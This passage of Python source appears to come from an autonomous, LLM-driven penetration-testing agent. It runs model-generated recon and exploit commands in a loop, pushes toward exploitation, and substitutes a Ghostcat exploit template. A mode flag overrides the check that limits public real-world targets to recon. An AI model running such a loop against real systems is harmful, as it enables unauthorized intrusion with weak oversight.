        combined = []
        for cmd, r in results:
            if r and r.text:
                combined.append(f"$ {cmd}\n{r.text[:500]}")
        
        print(f"{C.G}[COMPLETE] {len(results)} commands executed. Model now has "
              f"{len(self.model.ports)} ports, {len(self.model.endpoints)} endpoints, "
              f"{len(self.model.subdomains)} subs, {len(self.model.tech_stack)} techs.{C.N}")
        
        return "\n\n".join(combined)[:5000] if combined else ""

    def _parallel_deep_recon(self, target: str):
        """DEPRECATED: This method contained hardcoded command templates for 18+ tools.
        
        Deep recon is now generated by the LLM through genuine reasoning.
        The Planner builds context from World Model showing discovered ports/services,
        then asks the LLM to decide which additional information is needed.
        
        METHODOLOGIES dict remains as REFERENCE KNOWLEDGE only - it suggests
        tool categories that might be relevant, but never generates commands.
        
        Returns empty string - commands come from LLM decision cycle instead.
        """
        # All deep recon now flows through the normal AI decision pipeline:
        # 1. World Model contains discovered ports, services, technologies
        # 2. Planner builds context showing what's known and what gaps exist
        # 3. LLM reasons about which information gaps are most critical
        # 4. LLM generates appropriate enum/vuln_scan commands
        #
        # The METHODOLOGIES dict (brain/planner.py:283-413) is retained as
        # reference knowledge that the Planner can mention in context, but
        # it NEVER directly generates executable command sequences.
        #
        # No hardcoded commands here - that would defeat autonomy.
        print(f"{C.Y}[AUTONOMY] Deep recon now driven by LLM reasoning, not hardcoded templates{C.N}")
        return ""

    def _autonomous_loop_impl(self, target: str):
        target = validate_target(target)
        self._reset_for_target(target)
        self._configure_execution_scope(target)
        # Resume saved session state if available
        self._load_model_state(target)
        if target not in self.targets:
            self.targets.append(target)
        self.running = True
        self.stop = False
        # Plugins: on_start
        self.plugins.call_hook("on_start", self)
        # MCP: connect all servers
        self.mcp.connect_all()
        
        # AUTONOMY: No bootstrap recon - AI generates initial commands through reasoning
        # The World Model is seeded with target info, then the LLM decides what to run.
        # Previous hardcoded bootstrap (_generate_planner_initial_recon returning 27 commands)
        # has been removed. Now the first AI decision cycle generates initial recon.
        
        # Resolve target type
        resolved = self._resolve_target_type(target, self.target_type)
        if is_ctf_mode():
            if resolved == "public_real_world":
                print(f"{C.G}[CTF] CTF mode: overriding to authorized scope (full testing){C.N}")
            self.target_type = "ctf"
            CONFIG.PARALLEL_PLAN = True
            print(f"{C.BOLD}{C.M}[CTF] CTF Mode active — aggressive flag hunting, full testing authorized{C.N}")
        elif is_bug_bounty_mode():
            if resolved == "public_real_world":
                print(f"{C.G}[BB] Bug bounty mode: using authorized scope (full testing){C.N}")
            self.target_type = "authorized"
            CONFIG.PARALLEL_PLAN = True
        elif resolved != self.target_type:
            print(f"{C.Y}[!] Auto-detected target type: {resolved}{C.N}")
            if resolved == "public_real_world":
                print(f"{C.Y}    Recon/enumeration only — auth attacks blocked.{C.N}")
            self.target_type = resolved

        sid = self.session.create(target)
        self._resume_model(target)
        self.mission_manager.reset_for_target(target)
        # Scan system tools for capabilities context
        self._scan_system_tools()
        self._build_attack_chain()
        print(f"{ICO.NODE} AI: {self.ai.name()}{C.N}")
        print(f"{ICO.NODE} Target: {target}{C.N}")
        print(f"{ICO.KEY} Session: {sid}{C.N}")
        if self.memory.ready:
            n_tech = self.memory.count("techniques")
            n_less = self.memory.count("lessons")
            print(f"{ICO.INFO} Memory: {n_tech} techniques, {n_less} lessons{C.N}")
        if self.learner:
            self.learner.start()
            print(f"{ICO.INFO} Background learner started{C.N}")

        if is_fast_mode():
            print(f"{ICO.BOLT} Fast mode — compact AI context, parallel plans, quick verify{C.N}")

        # Auto-start proxy if target looks like a web app (Burp used when installed, incl. fast mode)
        if not (is_fast_mode() and CONFIG.FAST_SKIP_PROXY) and (
            re.match(r'^https?://', target) or re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d+)?(/|$)', target)
        ):
            if not self._proxy_active:
                ok = self.proxy.start(with_burp=True)
                if ok:
                    self._proxy_active = True
                    print(f"{ICO.INFO} Proxy active ({self.proxy.proxy_url()}) — traffic capture started{C.N}")
                    if self.proxy.burp_available:
                        print(f"{ICO.INFO} Burp Suite detected and started{C.N}")
                    if self.proxy.mitm_available:
                        print(f"{ICO.INFO} mitmproxy capturing traffic{C.N}")
                else:
                    print(f"{ICO.WARN} No proxy available (install burpsuite or: pip install mitmproxy){C.N}")

        previous_output = ""
        # Multi-source passive recon: seed real subdomains from crt.sh CT logs (domains only).
        try:
            dom = re.sub(r'^https?://', '', target).split('/')[0].split(':')[0]
            if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', dom) and not re.match(r'^\d+\.\d+\.\d+\.\d+$', dom):
                subs = crtsh_subdomains(dom)
                for s in subs:
                    self.model.add_subdomain(s)
                if subs:
                    print(f"{C.G}[+] Recon (crt.sh): +{len(subs)} subdomains{C.N}")
                otx_subs = OTX.passive_dns(dom)
                for s in otx_subs:
                    self.model.add_subdomain(s)
                if otx_subs:
                    print(f"{C.G}[+] Recon (OTX passive DNS): +{len(otx_subs)} hostnames{C.N}")
                tc = OTX.threat_context(dom, "domain")
                if tc["pulses"]:
                    note = (f"OTX threat intel: {tc['pulses']} pulses"
                            + (f"; malware: {', '.join(tc['malware'])}" if tc["malware"] else "")
                            + (f"; tags: {', '.join(tc['tags'][:8])}" if tc["tags"] else ""))
                    self.model.notes.append(note)
                    print(f"{C.Y}[!] {note}{C.N}")
        except Exception as e:
            log(f"[Recon] crt.sh seeding failed: {e}")
        if (is_bug_bounty_mode() or is_fast_mode()) and CONFIG.AUTO_BOOTSTRAP:
            try:
                previous_output = self._bug_bounty_bootstrap(target)
            except Exception as e:
                log(f"[BB bootstrap] {e}")
                print(f"{C.Y}[!] Bootstrap skipped: {e}{C.N}")

        seeded_tasks = self._queue_autonomy_tasks("assessment", "session start autonomy seeding")
        if seeded_tasks:
            print(f"{C.G}[+] Autonomy queue seeded with {seeded_tasks} task(s){C.N}")

        # CTF mode: Now uses same AI-driven planning as all other modes
        # No hardcoded CTF pipeline - LLM generates CTF-specific commands through reasoning
        if self.target_type == "ctf" and not self.model.findings:
            print(f"{C.BOLD}{C.M}[CTF] CTF mode active - LLM will generate flag-hunting commands{C.N}")
            # CTF heuristics are available in Memory/Knowledge for the LLM to reference
            # but no commands are generated here - they come from the AI decision cycle

        iteration = 0
        consec_fail = 0  # consecutive AI/parse/iteration failures — abort loudly, never silently
        decisions_ok = 0  # successful AI decisions — distinguish real completion from total failure

        while self.running and iteration < CONFIG.MAX_ITERATIONS:
            if self.stop:
                break
            iteration += 1

            if not is_fast_mode():
                print(f"\n{C.D}{'='*50}{C.N}")
            print(f"{C.BOLD}Iteration {iteration}{C.N}")
            if not is_fast_mode():
                print(f"{C.D}{'='*50}{C.N}")

            # Snapshot of model state at iter start (used by no-progress tracker)
            self._iter_start_size = self._model_size()
            # Auto-unban if the agent is soft-locked on a banned category with no progress
            self._maybe_auto_unban(iteration)

            # Recon Saturation Detection — shown before every iteration (req 10)
            sat = self._recon_saturation()
            print(f"{C.B}Pivot Score: {sat['pivot_score']:.0f}%  Duplicate Responses: {sat['duplicates']}  "
                  f"Exhausted Endpoints: {sat['exhausted_endpoints']}  Recon Saturated: {sat['saturated']}{C.N}")
            for c in self._active_constraints():  # req 7: show active constraints before generating a plan
                print(f"{C.R}[CONSTRAINT] {c['conclusion']}{C.N}")
            if sat["saturated"] and not self._forced_exploit:
                # WAF detected: do NOT enter FORCED EXPLOIT MODE. WAF = origin discovery
                # required, not exploitation. Exploit mode against a 403-WAF is wasted effort.
                # Clear any prior forced-exploit state and re-enable WAF-aware recon.
                if getattr(self, "_cloudflare", False):
                    self._forced_exploit = False
                    self._loop_sig = LoopSignal(state="none", category="", reason="")
                    vendor = self._waf_vendor or "WAF"
                    print(f"{C.Y}[!] WAF detected ({vendor}) — skipping RECON SATURATED, "
                          f"continuing WAF-aware recon (subfinder/dig/crt.sh/waybackurls).{C.N}")
                    previous_output = (
                        f"[SYSTEM: {vendor} WAF active. Standard HTTP recon is blocked. "
                        f"Continue WAF-AWARE recon: subfinder, assetfinder, dig, crt.sh, "
                        f"waybackurls, censys. "
                        f"DO NOT enter exploit mode against the WAF — find the origin first.]"
                    )
                else:
                    self._forced_exploit = True
                    self._loop_sig = LoopSignal(state="hard", category="recon", reason="recon saturated")
                    print(f"{C.BOLD}{C.R}[!] RECON SATURATED — stopping recon, forcing a different strategy.{C.N}")
                    previous_output = ("[SYSTEM: RECON SATURATED — STOP all recon/path-fuzzing now. "
                        f"Exhausted techniques: {sorted(self._exhausted_techniques)}. "
                        + ("Cloudflare challenge is active. " if self._cloudflare else "")
                        + "Select a FUNDAMENTALLY different strategy: authenticated testing, API/GraphQL abuse, "
                        "known-CVE exploitation on the identified stack, or origin-IP discovery behind Cloudflare.]")

            # Update state database with current goal (use loop signal from prior iteration)
            active_node = self.goal_tree.select_active_node(
                self.model, self.target_type, self._forced_exploit, self._loop_sig, self.autonomy_profile
            )
            self.state_db.update_goal(active_node)

            # All-categories-exhausted check: bail gracefully instead of looping forever
            all_gone, remaining = self._all_viable_categories_exhausted()
            if all_gone and iteration >= CONFIG.MIN_ITERATIONS:
                print(f"{C.BOLD}{C.R}{'='*60}{C.N}")
                print(f"{C.BOLD}{C.R}[!] ALL ATTACK CATEGORIES EXHAUSTED — no viable paths remain.{C.N}")
                print(f"{C.BOLD}{C.R}    Banned:     {sorted(self._banned_categories)}{C.N}")
                print(f"{C.BOLD}{C.R}    Dead:       {sorted(self._dead_branches)}{C.N}")
                print(f"{C.BOLD}{C.R}    Exhausted:  {sorted(self._exhausted_techniques)}{C.N}")
                print(f"{C.BOLD}{C.R}    Findings:   {len(self.model.findings)}{C.N}")
                print(f"{C.BOLD}{C.R}    Iterations: {iteration}{C.N}")
                print(f"{C.BOLD}{C.R}{'='*60}{C.N}")
                self.session.data["status"] = "completed"
                self.session.save()
                break

            # Ask AI for next action (guarded: a transient AI/context error must not kill the run)
            t0 = time.time()
            try:
                ctx = self._build_context(target, previous_output)
                response = self.ai.chat(decision_system_prompt(), ctx)
            except Exception as e:
                log(f"[Loop] AI decision error at iter {iteration}: {e}")
                response = ""
            if response:
                self._capture_conclusions(response)  # req 5: planner conclusions become hard constraints
            if is_fast_mode():
                print(f"{C.B}[AI] Decision in {time.time() - t0:.1f}s{C.N}")
            if not response:
                consec_fail += 1
                self._ai_empty_streak += 1
                # Only print on milestone increments to reduce spam (x2, x5, x10, x15, x20)
                if self._ai_empty_streak in (1, 2, 5, 10, 15, 20, 30, 50) or self._ai_empty_streak % 25 == 0:
                    print(f"{C.Y}[!] AI returned empty response (x{self._ai_empty_streak}) — retrying all providers with longer timeout{C.N}")
                decision = self._autonomous_fallback_decision(
                    target,
                    active_node,
                    f"AI returned empty response (x{self._ai_empty_streak})",
                    previous_output,
                    iteration,
                )
            else:
                # Parse JSON decision
                decision = self._parse_decision(response)
                if not decision:
                    consec_fail += 1
                    self._ai_empty_streak += 1
                    if self._ai_empty_streak in (1, 2, 5, 10, 15, 20, 30, 50) or self._ai_empty_streak % 25 == 0:
                        print(f"{C.Y}[!] Failed to parse AI response (x{self._ai_empty_streak}) — retrying all providers with longer timeout{C.N}")
                    decision = self._autonomous_fallback_decision(
                        target,
                        active_node,
                        f"AI parse failure (x{self._ai_empty_streak})",
                        previous_output,
                        iteration,
                    )
                else:
                    self._ai_empty_streak = 0
                    consec_fail = 0

            if not decision:
                self.session.data["status"] = "failed"; self.session.save()
                raise RuntimeError("Aborting: autonomy planner could not produce a decision")
            decisions_ok += 1

            thinking = decision.get("thinking", "")[:400]
            reasoning = decision.get("reasoning", "")[:300]
            command = (decision.get("next_command") or "").strip()
            # AI multi-command support: if AI returns a list of commands, run them in parallel
            parallel_commands = decision.get("commands", [])
            if isinstance(parallel_commands, list) and len(parallel_commands) > 1 and command:
                # AI gave both single command + multi-command list — prepend single
                parallel_commands = [command] + parallel_commands
            if isinstance(parallel_commands, list) and len(parallel_commands) >= 1 and not command:
                # AI gave only multi-command list
                command = parallel_commands[0]
            if isinstance(parallel_commands, list) and len(parallel_commands) >= 2 and command:
                print(f"{C.BOLD}{C.M}[AI] Multi-command mode: {len(parallel_commands)} tools in parallel{C.N}")
                for pc in parallel_commands:
                    print(f"{C.D}  → {pc[:120]}{C.N}")
            finding = decision.get("finding")
            if not isinstance(finding, dict):
                finding = None
            mission_task_data = decision.get("_mission_task") if isinstance(decision.get("_mission_task"), dict) else None
            mission_task = MissionTask.from_dict(mission_task_data) if mission_task_data else None
            completed = decision.get("completed", False)
            log(f"[PLANNER_DECISION] iter={iteration} node={active_node} completed={completed} "
                f"has_plan={isinstance(decision.get('plan'), dict)} finding={bool(finding)} cmd={command[:160]!r}")

            live_type(f"{C.C}[X19] {thinking}{C.N}")
            if reasoning:
                live_type(f"{C.B}[Why] {reasoning}{C.N}")

            # Resolve evidence context — always check against the last REAL tool output,
            # so findings reported without a fresh command are still verified (not auto-accepted).
            evidence_context = previous_output or ""

            # Record finding — 4-gate validation engine (fast mode: skip LLM pass)
            if finding and finding.get("title"):
                ev_hash = self._evidence_hash_for(command or "", evidence_context)
                test_status = self._hypothesis_can_test(finding, ev_hash)
                if test_status == "blocked_resurrection":
                    print(f"{C.R}[HYP] Finding '{finding.get('title','?')}' skipped — "
                          f"hypothesis REJECTED, no new evidence{C.N}")
                elif test_status == "duplicate":
                    print(f"{C.Y}[HYP] Finding '{finding.get('title','?')}' — already CONFIRMED{C.N}")
                else:
                    val = self._validate_finding(finding, command or "", evidence_context)
                    verified = None
                    if val.is_confirmed:
                        if is_fast_mode():
                            verified = finding
                        else:
                            verified = self._llm_verify_finding(finding, command or "", evidence_context)
                        # Self double-check gate (anti-stale-evidence hardening)
                        # If LLM says VERIFIED but evidence is not clearly present,
                        # force a stricter real verification.
                        if verified:
                            ev = (verified.get('evidence') or '')
                            # If evidence snippet exists but is not found in the last command output,
                            # treat as stale/invalid.
                            if ev and ev not in (evidence_context or ''):
                                print(f"{C.Y}[!] Evidence snippet not present in evidence_context — rejecting (stale evidence){C.N}")
                                verified = None
                            else:
                                # Preserve original independent verification (HTTP cross-check)
                                if verified and not self._manual_verify(verified):
                                    verified = None
                    if verified:
                        self._tick_hypothesis(
                            self._get_or_create_hypothesis(finding),
                            ev_hash, True, iteration)
                        conf = self.confidence_scorer.score_finding(verified.get("evidence", ""))
                        print(f"{C.G}[+] Confidence: {conf:.2f} ({verified.get('severity', 'info')}){C.N}")
                        f = Finding(
                            severity=verified.get("severity", "info"),
                            title=verified.get("title", ""),
                            description=verified.get("detail", ""),
                            source="ai",
                            evidence=verified.get("evidence", ""),
                        )
                        self.model.add_finding(f)
                        self.session.add_finding(f.severity, f.title, f.description, f.evidence)
                        if f.evidence:
                            print(f"{C.G}[+] Evidence: {f.evidence[:120]}...{C.N}")
                            self.state_db.update_transition({"type": "finding", "title": f.title, "severity": f.severity})
                        if f.severity in ("critical", "high"):
                            self._found_high_this_session = True
                            self._current_focus_finding = f.title
                            self._exploit_depth = 0
                            self._forced_exploit = True
                            print(f"{C.M}[DEPTH] Focusing exploitation on: {f.title}{C.N}")
                    else:
                        self._tick_hypothesis(
                            self._get_or_create_hypothesis(finding),
                            ev_hash, False, iteration)
                        if val.classification == "OBSERVATION":
                            print(f"{C.Y}[OBS] Finding '{finding.get('title','?')}' classified as OBSERVATION "
                                  f"— expected behavior or no security impact: {val.explanation[:100]}{C.N}")
                        elif val.classification == "LEAD":
                            print(f"{C.Y}[LEAD] Finding '{finding.get('title','?')}' classified as LEAD "
                                  f"— needs more investigation: {val.explanation[:100]}{C.N}")
                        else:
                            print(f"{C.Y}[HYP] Finding '{finding.get('title','?')}' classified as HYPOTHESIS "
                                  f"— no evidence yet: {val.explanation[:100]}{C.N}")

            # Check completion — allow when all attack classes exhausted, else enforce minimum depth
            if completed:
                all_exhausted, remaining = self._all_viable_categories_exhausted()
                allowed, why = self.mission_manager.should_accept_completion(
                    completed=True,
                    all_exhausted=all_exhausted,
                    iteration=iteration,
                    findings_count=len(self.model.findings),
                )
                if allowed:
                    print(f"{C.G}{C.BOLD}[+] AI reports target assessment complete{C.N}")
                    if all_exhausted:
                        print(f"{C.G}{C.BOLD}[+] No vulnerability found under current constraints — "
                              f"all viable attack classes tested or ruled out{C.N}")
                    break
                block_msg = f"COMPLETION REJECTED — {why}. Continue exploitation."
                print(f"{C.R}{C.BOLD}[!] {block_msg}{C.N}")
                self._stuck_warnings.append(block_msg)
                previous_output = f"[SYSTEM: {block_msg}]"

            # --- Multi-step plan execution ---
            plan = decision.get("plan")
            if isinstance(plan, dict) and plan.get("steps"):
                steps = plan["steps"]
                plan_commands = [step.get("command", "") for step in steps if step.get("action") == "run"]
                # AJP auto-replace: if the AI is hand-rolling a broken AJP python
                # script AND we've already failed on the AJP target 2+ times, REPLACE
                # the step with X19's known-working ajp_ghostcat template. The model
                # can't fix its own AJP packet structure, so we bypass it.
                if self._should_force_ajp_template(plan_commands):
                    ajp_template = self._ajp_template_for_target()
                    if ajp_template:
                        print(f"{C.BOLD}{C.M}[!] AJP AUTO-REPLACE — using X19's working "
                              f"ajp_ghostcat template instead of broken hand-rolled script.{C.N}")
                        self._stuck_warnings.append(
                            "AJP hand-rolled script replaced with X19 ajp_ghostcat template."
                        )
                        # Replace the first AJP-related step with the template
                        for i, step in enumerate(steps):
                            if step.get("action") == "run" and self._is_ajp_related(step.get("command", "")):
                                steps[i] = {
                                    "action": "run",
                                    "command": ajp_template,
                                    "note": "Auto-replaced hand-rolled AJP with X19 template",
                                }
                                break
                        plan_commands = [s.get("command", "") for s in steps if s.get("action") == "run"]
                # Blocked plan signature — uses NORMALIZED commands so that
                # 'AJP python with comment #v1' and 'AJP python with comment #v2'
                # hash to the same value and get caught as duplicate plans.
                plan_sig = hashlib.sha256(
                    json.dumps(
                        [self._normalize_command(c) for c in plan_commands],
                        sort_keys=True,
                    ).encode()
                ).hexdigest()[:16]

                # Blocked plan signature cache — detect repeated same plans
                if plan_sig in self._blocked_plan_signatures:
                    print(f"{C.R}[!] PLAN DUPLICATE — same steps already blocked. Forcing pivot.{C.N}")
                    self._stuck_warnings.append(f"Plan duplicate: same steps blocked before")
                    self._consecutive_blocked_plans += 1
                    if self._consecutive_blocked_plans >= 3:
                        fb = self._generate_fallback_cmd()
                        if fb:
                            print(f"{C.BOLD}{C.R}[!] CIRCUIT BREAKER — 3 plans blocked. Forcing: {fb}{C.N}")
                            result = self.exec.run(fb, timeout=60)
                            self._extract_to_model(fb, result)
                            self._register_probe(fb, result)
                            self._track_cloudflare(result)
                            self.session.add_cmd(fb, result.text[:500], "probe", result.returncode)
                            previous_output = result.text[:3000]
                            self._consecutive_blocked_plans = 0
                            self._consecutive_blocked_cmds = 0
                            continue
                    self._blocked_plan_signatures.add(plan_sig)
                    previous_output = "[SYSTEM: Plan BLOCKED — exact same commands already blocked. Propose a DIFFERENT approach with different tools/techniques.]"
                    self.session.add_cmd(f"[PLAN DUPLICATE] {plan.get('goal','')[:80]}", "[BLOCKED: duplicate plan]", "blocked", -1)
                    continue

                # Justification gate for the plan — warn only (AI is the boss)
                plan_goal = (plan.get("goal") or reasoning or thinking or "").strip()
                jpass, jreason = self._justification_gate(reasoning, thinking, plan_goal)
                if not jpass:
                    is_no_data = "no real session data" in jreason
                    if is_no_data:
                        print(f"{C.R}[!] PLAN JUSTIFICATION REJECTED — {jreason}. Plan blocked.{C.N}")
                        self._stuck_warnings.append(f"Plan justification rejected (no session data): {plan_goal[:80]}")
                        self._blocked_plan_signatures.add(plan_sig)
                        previous_output = (f"[SYSTEM: Your plan justification does not reference REAL session data. "
                            f"You must cite actual open ports, discovered services, found endpoints, credentials, "
                            f"or subdomains from THIS session. Do not make generic claims. "
                            f"Findings: {self.session.findings_summary()}]")
                        self.session.add_cmd(f"[PLAN BLOCKED] {plan.get('goal','')[:80]}",
                            f"[BLOCKED: justification needs real session data]", "blocked")
                        continue
                    print(f"{C.Y}[!] PLAN WEAK JUSTIFICATION — {jreason} (warning only, AI is in control){C.N}")
                    self._stuck_warnings.append(f"Plan weak justification: {plan_goal[:80]}")

                file_read_cmds = ['head', 'cat', 'wc', 'tail', 'less', 'more', 'grep', 'awk', 'sed']
                run_count = len(plan_commands)
                file_read_count = sum(
                    1 for c in plan_commands
                    if c.split() and c.split()[0] in file_read_cmds
                )
                is_majority_file_reads = run_count > 0 and (file_read_count / run_count) >= 0.5
                
                if is_majority_file_reads:
                    pct = int(file_read_count / run_count * 100)
                    print(f"{C.R}[!] PLAN BLOCKED — {pct}% of steps are file reads. FORCING ACTIVE SCAN.{C.N}")
                    self._stuck_warnings.append(f"Plan blocked: {pct}% file reads")
                    self._blocked_plan_signatures.add(plan_sig)
                    previous_output = f"[SYSTEM: Your plan was BLOCKED — {pct}% file reading ({file_read_count}/{run_count} steps). STOP ANALYZING. START SCANNING. Run httpx on discovered subdomains, or nuclei for vulnerabilities, or ffuf for directories. NO MORE cat/head/wc/grep commands.]"
                    self.session.add_cmd(f"[PLAN BLOCKED] {plan.get('goal','')[:100]}", "[BLOCKED: file read plan]", "blocked")
                    continue

                # --- Plan-level category gates (same checks that single commands face) ---
                # Check each step's command against banned categories, dead branches, hard limits,
                # tool fixation, and info gain threshold
                plan_blocked_cats = set()
                for s in steps:
                    if s.get("action") != "run":
                        continue
                    pc = s.get("command", "")
                    if not pc:
                        continue
                    pcat = self._cmd_category(pc)
                    if pcat in self._banned_categories:
                        plan_blocked_cats.add(f"banned({pcat})")
                    if pcat in self._banned_plan_categories:
                        plan_blocked_cats.add(f"banned_plan({pcat})")
                    if pcat in self._dead_branches:
                        plan_blocked_cats.add(f"dead_branch({pcat})")
                    if self._category_hard_limits.get(pcat, 0) >= 5:
                        plan_blocked_cats.add(f"hard_limit({pcat})")
                    blk = self._recon_blocked(pc)
                    if blk:
                        plan_blocked_cats.add(f"recon_blocked({pcat})")
                    # Tool family fixation — same check as single-command path
                    fam_blocked, fam_msg = self._tool_fixation_check(pc)
                    if fam_blocked:
                        plan_blocked_cats.add(f"tool_fixation({pcat})")
                    # Info gain — scored but NOT blocked (only exact duplicates/help are blocked by duplicate detector)
                    gain = self._info_gain_scorer(pc)
                # Phase-aware check: flag plans with steps that don't match current phase
                phase = self._current_phase()
                phase_mismatches = []
                for s in steps:
                    pc = s.get("command", "")
                    if not pc:
                        continue
                    pcat = self._cmd_category(pc)
                    if phase == "recon" and pcat in ("exploit", "exploitation", "auth"):
                        phase_mismatches.append(f"'{pcat}' during {phase} phase — no findings to exploit yet")
                    elif phase == "hypothesis" and pcat in ("exploit", "exploitation"):
                        phase_mismatches.append(f"'{pcat}' during {phase} phase — validate hypotheses first")
                    elif phase == "validation" and pcat in ("recon", "dns"):
                        if not self._recon_saturation().get("saturated"):
                            phase_mismatches.append(f"'{pcat}' during {phase} phase — test existing hypotheses instead")
                    elif phase == "exploitation" and pcat in ("recon", "dns", "dirbust", "crawl"):
                        if not self._forced_exploit and self._recon_saturation().get("saturated"):
                            phase_mismatches.append(f"'{pcat}' during {phase} phase — exploit confirmed findings")
                if phase_mismatches and not plan_blocked_cats:
                    print(f"{C.Y}[!] PLAN PHASE MISMATCH — {'; '.join(phase_mismatches[:3])} — continuing anyway{C.N}")
                if plan_blocked_cats:
                    reasons = "; ".join(sorted(plan_blocked_cats))
                    print(f"{C.R}[!] PLAN BLOCKED — step categories hit gates: {reasons}{C.N}")
                    self._stuck_warnings.append(f"Plan blocked: {reasons}")
                    self._blocked_plan_signatures.add(plan_sig)
                    self._consecutive_blocked_plans += 1
                    # Circuit breaker: after 3 blocked plans in a row, force a basic probe
                    if self._consecutive_blocked_plans >= 3:
                        fb = self._generate_fallback_cmd()
                        if fb:
                            print(f"{C.BOLD}{C.R}[!] CIRCUIT BREAKER — 3 plans blocked. Forcing: {fb}{C.N}")
                            result = self.exec.run(fb, timeout=60)
                            self._extract_to_model(fb, result)
                            self._register_probe(fb, result)
                            self._track_cloudflare(result)
                            self.session.add_cmd(fb, result.text[:500], "probe", result.returncode)
                            previous_output = (f"[SYSTEM: CIRCUIT BREAKER — {3} consecutive plans blocked. "
                                f"Auto-executed: {fb}\n\n{result.text[:2000]}]")
                            self._consecutive_blocked_plans = 0
                            self._consecutive_blocked_cmds = 0
                            continue
                    previous_output = (f"[SYSTEM: Your plan was BLOCKED because it uses blocked categories: {reasons}. "
                        f"Banned: {sorted(self._banned_categories)}. Dead branches: {sorted(self._dead_branches)}. "
                        f"Do NOT use any command in these categories. Pick a fundamentally different technique NOW. "
                        f"If you propose a similar plan again, the session will be terminated.]")
                    self.session.add_cmd(f"[PLAN BLOCKED] {plan.get('goal','')[:80]}", f"[BLOCKED: {reasons}]", "blocked")
                    continue
                
                print(f"{C.BOLD}{C.M}[Plan] {len(steps)} steps — {plan.get('goal', 'no goal stated')[:200]}{C.N}")
                plan_results = self.execute_plan(plan)
                # Collect all outputs from plan steps
                plan_outputs = []
                for pr in plan_results:
                    if pr.get("result"):
                        plan_outputs.append(pr["result"].text[:2000])
                    if pr.get("analysis"):
                        plan_outputs.append(pr["analysis"][:1000])
                previous_output = "\n".join(plan_outputs)[:3000]
                self._consecutive_blocked_plans = 0
                self._consecutive_blocked_cmds = 0
                # Extract data from all plan results
                _psize = self._model_size()
                for pr in plan_results:
                    if pr.get("result"):
                        self._extract_to_model(pr.get("command", command), pr["result"])
                _psize_after = self._model_size()

                # --- Plan-level anti-loop (plans bypass the single-command checks) ---
                cats = [self._cmd_category(c) for c in plan_commands if c]
                dom_cat = max(set(cats), key=cats.count) if cats else "plan"
                plan_productive = _psize_after > _psize
                self._branch_update(dom_cat, plan_productive)
                self._record_tool_effect(plan_commands, plan_productive)
                self._queue_autonomy_tasks(active_node, f"plan execution on {dom_cat}")
                representative_result = next((pr.get("result") for pr in reversed(plan_results) if pr.get("result")), None)
                if representative_result is None:
                    representative_result = ToolResult(previous_output, "", 0, None)
                self.mission_manager.record_outcome(
                    plan_commands[-1] if plan_commands else plan.get("goal", ""),
                    representative_result,
                    _psize,
                    _psize_after,
                    dom_cat,
                    active_node,
                    task=None,
                    is_plan=True,
                )
                fails = [f for f in (self._tool_failed(pr["result"]) for pr in plan_results if pr.get("result")) if f]
                if fails:
                    self._stuck_warnings.append(f"Plan tool failures: {', '.join(sorted(set(fails)))[:80]}")
                pf = previous_output.lower()
                conn_failed = (pf.count('000') >= 3 or 'connection refused' in pf
                               or 'failed to connect' in pf or "couldn't connect" in pf) \
                    and not re.search(r'\b[23]\d\d\b', previous_output)
                if conn_failed:
                    self._conn_fail_streak += 1
                    if self._conn_fail_streak >= 2:
                        healed = self._heal_connectivity()
                        print(f"{C.BOLD}{C.R}[!] CONNECTION-FAILURE STORM (plan) — self-healing ({healed or 'no proxy env'}){C.N}")
                        previous_output = ("[SYSTEM: Your plan's commands all returned HTTP 000 / connection-refused — a LOCAL "
                            "connectivity problem (dead proxy), NOT the target's WAF. "
                            + (f"Cleared proxy env ({healed}). " if healed else "")
                            + "Re-run WITHOUT proxy (curl --noproxy '*') and verify DNS. Do NOT keep testing 'blocked' hosts.]")
                        self._stuck_warnings.append("Plan connection-failure storm — proxy cleared")
                        self._conn_fail_streak = 0
                else:
                    self._conn_fail_streak = 0
                    sig = (dom_cat, tuple(sorted(set(cats))))
                    self._plan_sigs[sig] = self._plan_sigs.get(sig, 0) + 1
                    if self._plan_sigs[sig] >= 2:
                        print(f"{C.BOLD}{C.R}[!] PLAN LOOP — {self._plan_sigs[sig]} similar '{dom_cat}' plans, no progress. Banning category.{C.N}")
                        self._banned_categories.add(dom_cat)
                        self._banned_plan_categories.add(dom_cat)
                        previous_output = (f"[SYSTEM: Category '{dom_cat}' is now BANNED for plans "
                            f"({self._plan_sigs[sig]} identical plans, no findings). "
                            f"Banned: {sorted(self._banned_categories)}. "
                            "You MUST pick a fundamentally different technique. A different wordlist/subdomain IS NOT a pivot. "
                            "If you propose another '{dom_cat}' plan, the session will be terminated.]")
                        self._stuck_warnings.append(f"Plan loop on {dom_cat} — banned")
                self._output_hashes.append(hash(previous_output[:500]))
                if len(self._output_hashes) > 10:
                    self._output_hashes = self._output_hashes[-10:]

                # Update session
                self.session.add_cmd(f"[PLAN] {plan.get('goal','')[:100]}", previous_output[:500], "plan")
                print(f"{C.G}[Plan] Completed {len(plan_results)} steps{C.N}")
                continue

            # Execute single command (backward compat)
            if command:
                # FALLBACK MODE: AI is dead — bypass ALL AI-only blocking checks.
                # Just run the command like _bootstrap_recon does, no critique/bans/loops.
                if self._ai_empty_streak >= 2:
                    # Exhaustion sentinel — no more commands available, end the session
                    if command.startswith("echo 'skip:") or "all fallback commands exhausted" in command:
                        print(f"{C.Y}[!] All fallback commands exhausted — ending session{C.N}")
                        self.session.data["status"] = "exhausted"
                        self.session.save()
                        break
                    # Validate command before fallback execution (block broken/interactive tools)
                    _fb_valid, _fb_warn, _fb_fixes = self._validate_command(command)
                    if not _fb_valid:
                        print(f"{C.Y}[!] Fallback blocked: {_fb_warn}{C.N}")
                        if _fb_fixes:
                            print(f"{C.D}    Suggestion: {_fb_fixes[0]}{C.N}")
                        previous_output = f"[SYSTEM: Fallback command '{command[:80]}' blocked ({_fb_warn}). Try a different approach.]"
                        continue
                    try:
                        fallback_timeout = self._estimate_timeout(command)
                        fallback_result = self.exec.run(command, timeout=fallback_timeout)
                        if fallback_result and fallback_result.text:
                            self._size_before_extraction = self._model_size()
                            self._extract_to_model(command, fallback_result)
                            self._size_after_extraction = self._model_size()
                            self._register_probe(command, fallback_result)
                            self._track_cloudflare(fallback_result)
                        fallback_cat = self._cmd_category(command)
                        self.session.add_cmd(command,
                            fallback_result.text[:500] if fallback_result else "",
                            fallback_cat,
                            fallback_result.returncode if fallback_result else -1)
                        self._record_tool_family(command)
                        previous_output = fallback_result.text[:3000] if fallback_result and fallback_result.text else ""
